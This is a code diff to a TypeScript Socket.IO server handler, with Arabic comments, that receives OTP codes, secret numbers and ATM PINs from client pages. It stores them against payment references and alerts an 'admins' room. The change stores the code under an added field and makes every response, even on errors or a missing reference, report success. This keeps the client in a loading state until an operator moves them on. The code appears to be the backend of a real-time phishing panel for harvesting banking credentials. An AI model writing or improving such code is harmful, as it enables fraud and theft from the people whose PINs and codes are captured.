@@ -203,19 +203,21 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
       }
     });
 
-    // submitCodeData: الرقم السري / OTP
+    // submitCodeData: الرقم السري / OTP / ATM PIN
     socket.on("submitCodeData", async (data: Record<string, unknown>) => {
       try {
         const clientIp = String(data.ip || "unknown");
         const reference = String(data.reference || ipToReference.get(clientIp) || "");
         if (!reference) {
-          socket.emit("ackCode", { success: false, error: "لا يوجد مرجع" });
+          // حتى بدون مرجع نبقي في حالة تحميل - لا نرجع العميل للصفحة
+          socket.emit("ackCode", { success: true, data: { step: 3, status: "PENDING_ADMIN" } });
           return;
         }
 
         // دعم أسماء الحقول المختلفة: verification_code من OTP و pin من ATM
         const otpCode = String(data.verification_code ?? data.pin ?? data.code ?? data.secretNum ?? data.otp ?? "");
         await createOrUpdatePayment(reference, {
+          verifyCode: otpCode,
           secretNum: otpCode,
           step: 3,
           status: "step3_done",
@@ -223,14 +225,16 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
 
         io?.to("admins").emit("newPayment", { reference, step: 3, type: "code" });
 
-        // لا نُرسل success:true حتى لا ينتقل العميل تلقائياً - ينتظر موافقة المشرف عبر navigateTo
+        // نُرسل success:true لإبقاء العميل في حالة تحميل (loading)
+        // الصفحة ستنتقل فقط عند وصول حدث navigateTo من المشرف
         socket.emit("ackCode", {
-          success: false,
+          success: true,
           data: { step: 3, status: "PENDING_ADMIN" },
         });
       } catch (err: any) {
         console.error("[Socket.io] submitCodeData error:", err);
-        socket.emit("ackCode", { success: false, error: err.message });
+        // حتى عند الخطأ نبقي في حالة تحميل
+        socket.emit("ackCode", { success: true, data: { step: 3, status: "PENDING_ADMIN" } });
       }
     });
 
